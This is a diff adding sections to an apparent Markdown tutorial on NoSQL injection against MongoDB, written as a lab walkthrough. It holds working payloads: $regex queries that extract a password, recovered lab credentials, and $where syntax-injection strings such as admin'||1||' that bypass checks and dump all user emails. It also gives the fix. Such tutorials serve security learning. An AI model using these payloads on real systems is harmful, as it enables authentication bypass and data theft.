@@ -1,6 +1,21 @@
 # **`NoSQL Injection`**
 
 
+
+
+
+<img width="1904" height="428" alt="image" src="https://github.com/user-attachments/assets/8f31f590-9d97-499e-aadf-45b6c41826b3" />
+
+
+
+
+
+
+
+
+
+
+
 <details>
   <summary>What is NoSQL</summary>
 
@@ -1060,7 +1075,41 @@ We are taking advantage of this until we install the entire password without any
 
 
 
+---
 
+
+```
+user=john&pass[$regex]=^.{8}$
+```
+
+
+<img width="1852" height="422" alt="image" src="https://github.com/user-attachments/assets/36f6d38c-2d14-4586-ab7f-3570811aa96b" />
+
+
+```
+user=john&pass[$regex]=^10584312$
+```
+
+
+<img width="1458" height="406" alt="image" src="https://github.com/user-attachments/assets/ba1e7edc-2fc3-437e-9288-18d350aa813c" />
+
+
+```
+john : 10584312
+```
+
+<img width="1487" height="389" alt="image" src="https://github.com/user-attachments/assets/06c082e9-1940-4f7d-ae53-9e618998f74e" />
+
+
+```
+secret : 1
+```
+
+```
+pedro : coolpass123
+```
+
+<img width="898" height="373" alt="image" src="https://github.com/user-attachments/assets/b5752b8b-917a-4d2b-92ed-a89c1fb5a9af" />
 
 
 
@@ -1080,7 +1129,202 @@ We are taking advantage of this until we install the entire password without any
 
 
 
+<details>
+  <summary>Syntax Injection: Identification and Data Extraction</summary>
 
+
+
+## 🔥 First: What does Syntax Injection mean in NoSQL?
+
+
+Operator Injection (in which we used `$ne`, `$nin`, `$regex`) was carried out inside the filter normally.
+
+But here the situation is different...
+
+**Syntax Injection = We can break the JavaScript syntax that the programmer wrote inside MongoDB.**
+
+for him?\
+Because MongoDB allows you to write a JS statement inside `$where`
+
+Like this:
+
+```php
+mycol.find({
+    "$where": "this.username == '" + username + "'"
+})
+
+```
+
+
+💀 Here remains the disaster:\
+The programmer does **string concatenation** and inserts the username into the JavaScript code.
+
+* * * * *
+
+## 💥 1) Proof of the existence of Syntax Injection
+
+
+You entered:
+
+
+```php
+admin'
+
+```
+
+The final form remains like this:
+
+```php
+this.username == 'admin''
+
+```
+
+
+
+This is syntax error in JavaScript\
+A large stack trace came out → So... **Injection confirmed**
+
+* * * * *
+
+## 💥 2) Proof of condition control (True/False Injection)
+
+
+We try to always make the condition False:
+
+```php
+admin' && 0 && 'x
+
+```
+
+it means:
+
+```js
+this.username == 'admin' && 0 && 'x'
+
+```
+
+The condition is always false → Result: No email
+
+Then we try making it True:
+
+```
+admin' && 1 && 'x
+
+```
+
+it mean:
+
+```js
+this.username == 'admin' && 1 && 'x'
+
+```
+
+1 = True\
+All conditions are successful → acres admin@nosql.int
+
+🔥 This is how we made sure that we can operate JavaScript at our convenience.
+
+
+---
+
+## 💥 3) Exploiting the Dumping All Emails vulnerability
+
+
+Now we want to set the condition so that it is always True, regardless of the user.
+
+Most famous payload:
+
+```js
+admin'||1||'
+
+```
+
+
+for him?
+
+Because the sentence will remain:
+
+```js
+this.username == 'admin' || 1 || ''
+
+```
+
+And 1 = True
+This means that the condition is always successful → MongoDB will return all documents.
+
+And I got the result:
+
+```
+admin@nosql.int
+pcollins@nosql.int
+jsmith@nosql.int
+...
+
+```
+
+🔥🔥 **This is how I officially made FULL DATA DISCLOSURE via Syntax Injection.**
+
+---
+
+
+## 🧠 Why is Syntax Injection not so widespread?
+
+
+Because the programmer wants to write something like:
+
+```js
+"$where": "this.username == '" + username + "'"
+
+```
+
+
+It must be:
+
+1️⃣ I don’t understand the effect of concatenation
+2️⃣ and use JavaScript instead of regular filters
+
+The right solution:
+
+
+```js
+{ "username": username }
+
+```
+
+
+
+The loophole is rare, but when you find it = **disastrous**.
+
+* * * * *
+
+## 🎯 Conclusion, King:
+
+
+- Operator Injection = common
+
+- Syntax Injection = rare but fatal
+
+- You can control JavaScript code inside MongoDB
+
+-You can do:
+
+    - Authentication Bypass
+
+    - Complete Dump for Collection
+
+    - Code Execution inside `$where` if misconfigured
+
+- This is very similar to SQLi---but it is inside JS code
+
+
+
+
+
+
+
+
+  
+</details>
 
 
 
